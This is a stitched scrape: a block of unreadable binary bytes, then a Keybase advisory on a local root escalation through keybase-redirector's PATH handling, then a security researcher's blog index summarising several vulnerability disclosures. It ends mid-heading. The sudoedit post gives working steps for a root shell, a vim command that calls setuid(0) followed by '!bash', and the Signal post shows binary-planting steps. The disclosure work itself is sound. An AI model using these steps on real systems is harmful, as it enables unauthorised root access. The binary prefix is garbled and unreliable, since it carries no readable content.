!�m[sMu�x�}��Ͻ�� +n�%q�.0X @��4:��(m��U�O��n����j�f@ǪڌG��31ͤc���3�B�p`D�󾔧��MC� �<7\*$1���%qPC��D���t9�cmO t�Pm�![���Q�]`�Bq��W( �W��b&�ͻ� d�5�P}��[$Pbw;Y�d̊\p�п��j�h
Ro�!��5��C
�,��&�����H �j"P�շJ�dL��s\* �+�Sn����^���1z,K�b��(��B?�B�f�h78l�)��`������+} E��1��
��[$䜛�+Yg���v\*�Zy��1J����m�E�nH�E\_����?�}�}s� �9�
dH���KB��hK�R(��� ��$�◐)�E�뼤8��!S�����:j��Z�����; �0���E�i�L ('�}!���v��L8D��D1j����]l�[�]�R ���6�~�������&�� p�6}�{���dgJZ^ �S}3�&To�bE�����oc��9
�+�4�5��һ\*���51z�K7�7�6{��s�u�)+���;�l���'zY�<�66'�klllΪ��k�r��u��W�'��I��.�$m��/���|YJ���6�Ŧ/!Ӽ�y�4 �a�<�C�hh? n\_�Vl�,�R�e�����4�c�D�[�|�J��� ���;�|�=R���!a���H��w��� ݼ��''���|c�h666/9t���\Ēv�J�BAlZ׬J�T/D�y��Uw�<��/K�s\=�����v�" ����m�l5���F�z>]h�����ED �T�����b���R�\�8��{��lvoGA�<�T0J?���'�s
��'5���~ǧN����k��w�߅��x�����o[)�v�=n�v� �ậL��b����&3�n����حr<�����6r�E�66�gU]��j66gz���V���ӵ5���J�
" d��#�i���w�\_ �t�o��iv],�\_r�i Tpy�ǜ�(�^3Y�4z�����N�[�� v����Փ� ���{!D��Uy�;�w���H1r�/!R�4s�z�{�w�۞���`�-4C�w�V��Q�w�DO8Hގ��z�8�[�F�sZ�  uK��8��i����~)c����NM��@9�|�ۋ�TFI}��#w���K؉ૌ\J�)�X!u����0�+��>λ�\_2sa���&�ů��, (���jJ!w���R�kQ�T0@imm��u��� x�r��QR����r��z�o3�mfh�T���V�(H�`ާ�lυ�R@P\_w���6jcp�8x� ��ijߛ"��� ��<�q�Gc�7�+������Py�%�����Nnkn��57� �n!rwz'�;��z��;E�����7�q����6�f ����� ��rwWPD�V)H�ZF<�)����.�#�
�;ë��a�1^ї�d��'�v�l,BgÎ�U7)�J�����{�S�R��l}'mbqOՏm`�U�R��M�t�f�W�&��41��\*H9ّ�c��2b0I�y%�v�aY��ﳐ��ށ槧��O�~��z�����~�6�i�a�`R �+��w�Z9
���?��E�G���n .�6lذu�~<5���s[������[}~�N�QFq�n׻����?�Lb5�������N70��]�z�4��znb���P������+KI�M�(�/s���L����,T���O�pK{
>�ːyv^� η�˨���ZeP��\*�#^V�cr/��՟�~ ��S�nࣥ�:\*���H�k��B ��%� ȸ�?Z7�3�h��/G����� Ո�u��m��)y��C��2�nܮ y��  M?
 ��� :p��\_��l� !���@�?ag0`�����S�Zǡ1E��.���Yh�NIS{������ӉN��%����� #Z�=������I�\* Ӕi����ӄk�⒌R���d�$=�lQ��x��<==�U�@L���%m�'��>-�Ƚ�∳�hl�Oa��\_۬)R����,�" �i|�������3�q�Y= �zs�\��.-�[X�`�f��n��ϱ�D �5GL��\_e?�@��Kx��
�h�HG��\_�ҭ
�.t�S�%nq��� <�ט����gg?Z��?�8��v��&�S��L�h^y���«��X8��ڬ� �/�莔|ldxV���u�#�(���?�O���E�z(�1x�ЙqX?�R
'�׷&4�\�+��y�$y�� �N�H�eJQ�����x��W��H�g@�����;��'a�{],�h�->>����ٸÇ�������`X�d��QP��V�~���b1/�x��b�&����e���f 1��1�p������nG��ϊ�޲O���&d��� �ac��R  �&y�T�ٳȯ� ��#9 0�aOD�ϵ��{�,J �rX�}��`[ ���\_��l�k& �Z�m�,��X(�7���T�f���A��7E�C��&P�9}P;�@� ��$�%��`����f�}�((+Ș\* 06[ �!@���j9fk �ŧ�I��`m+z��dt���� w�PS��T��IR��zypZGp��jN�൪�h�YU�6�J�:�0��ǡa�� �����]��˹}0�"J  Mp�0iek˵3 O2`����}�%�� UT�s�������V~�~,��x��8�Z\����H����I��1�$��ҹ,|�<�U��9t�!����� �/�A��������L�����R. 8�4% �e���.��Ge�E���uV�>x������zA��Zb������E��wV��6�� ��?���R��G]�|���@�}�(�>��)iq��I���T~NS�X�h���~ �\*�^��3!.��q\��v�X#K�%ޑ e[T�Vy�~�`��<�9�7� �6`��9B�w/B���}����pH��\* /^J$�����SP�D��^[!�S�q\*�ێ;�8�?�U"�����n��A��R:������LO�E��쒼D�\�8ɯ���ͽ�)�ю;�M��0����֡n �3
��� Ѩ�v�L��f��z!�'��\* b��q��#��iD������W �� ��b��R�]�,  �~�<�RDg :F�њ"M�0s�4}qCW\*%�=I`�%]|�.������Q�>P�����WN�OQ��
���c��h�L��\_��� B$�N�+�!��]\_����\_D �Ze�\f��D�)�T67�7��)�c����uz������|�����^\_\_?�ğm����0�~��� �N���l��@>[���g��ح���=�6u��.���Z��R)�^���P9K6 ܪhٺ&P <�$���~�\e����g �n��O�\*m�hN�wV
�l��N5�^њ�SZ�lvG�����\*��
��d�r��|࣫N�t&�f�Wnoi�ἅVn�PJ�N�
G��
��y#��uÙ����s"c��E�!|`���2\_655e�����ﰘ����~G�

=== Content from keybase.io_7a9c6658_20250125_224223.html ===


[![](/images/icons/icon-keybase-logo-48.png)](/)

Keybase Staging Server

| [Install](/download) | [Login](#_) |  |  |  |
| --- | --- | --- | --- | --- |

×

×

Docs > Security Advisories

### Security Updates

* •[KB 001 (2018.12.18)](/docs/secadv/kb001)
* •[KB 002 (2018.12.18)](/docs/secadv/kb002)
* •[KB 003 (2018.12.25)](/docs/secadv/kb003)
* •[KB 004 (2018.01.18)](/docs/secadv/kb004)

Docs > Security Advisories >
Security Updates > KB 001 (2018.12.18)
Security Updates > KB 002 (2018.12.18)
Security Updates > KB 003 (2018.12.25)
Security Updates > KB 004 (2018.01.18)

## Local Privilege Escalation on Linux via keybase-redirector (KB002)

### Publication Date

2018 Dec 18

### Externals Links

* [HackerOne Report from michr](https://hackerone.com/reports/426944)
* [MITRE CVE-2018-18629](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18629)

### Description

The Keybase
[file system redirector](https://github.com/keybase/client/tree/master/go/kbfs/redirector)
controls the `/keybase` mountpoint on Linux machines (and macOS
machines that have enabled Finder integration). In order to support
multiple users running Keybase on the same machine, both able to
access the Keybase file system through `/keybase` paths, this
mountpoint acts as a redirector, using FUSE to present symlinks to
user, redirecting them to their personal Keybase file system
mountpoint (usually located at `/run/user/UID/keybase/kbfs` on Linux,
though it varies by OS distribution and local configuration). The
binary that creates this mountpoint is called `keybase-redirector`,
and the Keybase package installer sets its suid bit so that it can
have root permissions, which are necessary to create the `/keybase`
mountpoint and to mount a FUSE file system that can be accessed by
multiple users. It is executable by any user, since users run
Keybase under their own accounts.

The attack was possible due to a previous version of
`keybase-redirector` that used the `fusermount` binary to create the
`/keybase` mountpoint. It did this indirectly through a call to the
`Mount()` function in the Go library
[bazil.org/fuse](https://github.com/bazil/fuse) (forked for Keybase
[here](https://github.com/keybase/fuse)), after obtaining root
privileges. That function used Go's
[exec.Command](https://golang.org/pkg/os/exec/#Command) function to
execute a call to `fusermount`. However, it did not specify an
absolute path or clear the environment when doing so. Because of
this, malicious software running on the user's computer could make any
executable named `fusermount`, set their `$PATH` environment variable
to include the directory containing that executable, and call
`keybase-redirector`, tricking it into running that executable with
root permissions.

Note that macOS was not vulnerable to this bug, because
`keybase-redirector` does not have the suid bit set on that platform.
It is only run by root via the Keybase helper.

This attack was discovered by HackerOne researcher Rich Mirch
([mirchr](https://hackerone.com/mirchr)) on 2018 Oct 22. We are deeply
thankful to Rich for doing such good research and for sharing his findings in
such a timely and responsible manner.

### The Fix

The immediate fix was a change to
[restrict the PATH used by keybase-redirector](https://github.com/keybase/kbfs/commit/eef09fd5d71579fef03a7c9ac30a40d6aed7aff2).
Later, we further hardened the redirector by
[directly using the `Mount` syscall instead of a separate binary](https://github.com/keybase/fuse/commit/a8447a81d2b76962a5a3e54f4f374f20c2a39bfb)
when running as root, and
[minimizing the time we use root privileges](https://github.com/keybase/kbfs/commit/bd408b5d80a7b38152e3bd9138393bc61333b4e6).
The result is that `keybase-redirector` no longer executes other
binaries, and only uses root permissions while performing the `Mount`
syscall. It reverts to user permissions while serving FUSE requests
for users of the `/keybase` mountpoint.

We released the initial fix in late October 2018
(2.8.0-20181023124437), and the further-hardened version in November
2018 (2.10.0-20181112152732).

### Affected Versions

Keybase versions release on or after March 1, 2018
([commit 06b97bb3](https://github.com/keybase/kbfs/pull/1496/commits/06b97bb3f32542c02f788d259ccf3705bda8dac8)),
and prior to 2.8.0-20181023124437.

### Remediation

Upgrade to 2.8.0-20181023124437 or above. All package repos received
an upgraded package shortly after the bug was discovered.

It is also possible to disable the file system redirector if it's not
wanted. See the instructions
[here](https://keybase.io/docs/kbfs/understanding_kbfs) under "Root
redirector".

### Timeline

* 2018 Oct 22 — Vulnerability reported to HackerOne
* 2018 Oct 22 — Fix commited to master
* 2018 Oct 23 — New Linux release (2.8.0-20181023124437) pushed out to distribution package repositories for Ubuntu, Red Hat, and Arch
* 2018 Nov 11 — Subsequent release with further hardening ((2.10.0-20181112152732)
* 2018 Dec 3 — E-mails sent out to all users still running affected versions, asking for users to upgrade
* 2018 Dec 4 — In-app warnings sent out to all old applications, asking for users to ugprade
* 2018 Dec 6 — In-app message from [max](https://keybase.io/max) asking for users to upgrade
* 2018 Dec 11 — Affected versions bricked via server switch
* 2018 Dec 18 — This announcement

![](/images/walkthrough/footprints_transp.png)

Keybase, 2025
| Available within Tor at **http://keybase5wmilwokqirssclfnsqrjdsi7jdir5wy7y7iu3tanwmtp6oid.onion**

[install Keybase](/download)
| [read our blog](/blog)
| [documentation](/docs)
| [bug reporting](/docs/bug_reporting)
| [security advisories](/docs/secadv)

[terms](/docs/terms)
& [privacy](/docs/privacypolicy)
& [california ccpa](/docs/california-ccpa)
& [acceptable use](/docs/acceptable-use-policy)

[jobs @ keybase](/jobs)

[Please send us feedback & bug reports](https://github.com/keybase/client/issues).

Keybase, 2025
| [read our blog](/blog)

[terms](/docs/terms)
& [privacy](/docs/privacypolicy)
& [security advisories](/docs/secadv)
& [california ccpa](/docs/california-ccpa)
& [acceptable use](/docs/acceptable-use-policy)



=== Content from blog.mirch.io_876decba_20250126_123159.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

